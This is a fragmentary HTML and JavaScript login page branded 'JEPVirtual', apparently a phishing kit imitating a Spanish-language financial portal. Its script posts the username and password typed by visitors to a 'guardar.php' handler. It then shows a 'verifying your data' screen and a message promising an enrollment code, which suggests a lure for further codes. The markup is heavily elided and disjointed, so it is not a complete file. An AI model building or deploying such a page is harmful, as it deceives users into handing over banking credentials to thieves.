...
<script type="text/javascript">
  ...
  $.ajax({
    ...
    type:"POST",
    url:"guardar.php",
    data:{nombre1:Nombre1,pass:pass}
    }).done(function(msg){
     ...
     <script type="text/javascript">
        ...
        function count() {
         ...
         function secondPassed() {
            ...
            var minutes = Math.round((seconds - 25) / 60); //calcula el número de minutos
...
<div class=" col-sm-6 col-md-6 JEPVirtual-logo">
        ...
        <h3 align="center" style="color: white;">Verificado sus Datos</h3>
...
<input type="hidden" name="j_idt64:j_idt66" value="j_idt64:j_idt66" />
      ...
      <div align="center"><label style="color:#A1BF37">CARGANDO<br></label>
       ...
       <h4><label style="color:white;">Por favor espere mientras te enviamos un codigo para la matriculación de tu cuenta.<br> 
  ...
  <div id="j_idt23" class="container">
    ...
    <div id="content" class="left_content">
      <f:event type="preRenderView"></f:event>
        ...
        <p align="center">
          <strong>Estimado usuario,</strong> si su ingreso a esta pantalla es por primera vez digite su n&uacute;mero de identificaci&oacute;n. <br />
          Si usted ya se registr&oacute; ingrese su nuevo usuario.<br>Ingrese sus datos para verificar que es usted.
        </p>
...
<script id="j_idt27_s" type="text/javascript">$(function(){PrimeFaces.cw("IdleMonitor","widget_j_idt27",{id:"j_idt27",timeout:600000,multiWindowSupport:false,onidle:function(){startIdleMonitor()}});});</script>
    ...
    <input id="username1" name="username1" type="inputInicio" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all form-control" aria-required="true" autocomplete="off" placeholder="Nombre de Usuario" onkeypress="if (event.keyCode == 13) {  ejecutarkeysignin(); }" onkeyup="ocultar('componente_error');ocultar('componenterecargue');" required />
    <div id="j_idt29" class="ui-messages ui-widget" aria-live="polite"></div>
            ...
            <input id="password1" name="password1" type="password" style="margin-bottom: 0px;" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all form-control input-password" aria-required="true" autocomplete="off" maxlength="30" placeholder="Contrase&ntilde;a" onkeypress="if (event.keyCode == 13) {  ejecutarkeysignin(); }" onkeyup="ocultar('componente_error');ocultar('componenterecargue');" required />
            ...
            <img id="verPwd" class="ver-pwd-icon" src="svg/ver_pwd.svg" alt="Mostar Contrase&ntilde;a" style="width: 30px;" onmouseover="this.src='svg/ver_pwd_hover.svg';" onmousedown="viewTextPassword();" onmouseup="viewPassword();" onmouseout="viewPassword();this.src='/recursosJep/images/ver_pwd.svg';" />

            <div id="j_idt32" class="ui-messages ui-widget" aria-live="polite"></div>

            <input id="password" name="password" type="hidden" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all " />



            <script id="password_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_password",{id:"password"});});</script>

            <input id="localizacion" name="localizacion" type="hidden" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all " />

            <script id="localizacion_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_localizacion",{id:"localizacion"});});</script><br>
            ...
            <script id="password1_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_password1",{id:"passmail",maxlength:30});});</script>
            ...
            <br /><button id="btnSignin" name="btnSignin" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only btn btn-lg btn-primary btn-block" onclick="javascript:RUsuario();" style="margin-left: 29% !important;" type="button"><span class="ui-button-text ui-c">ACCEDER</span></button>
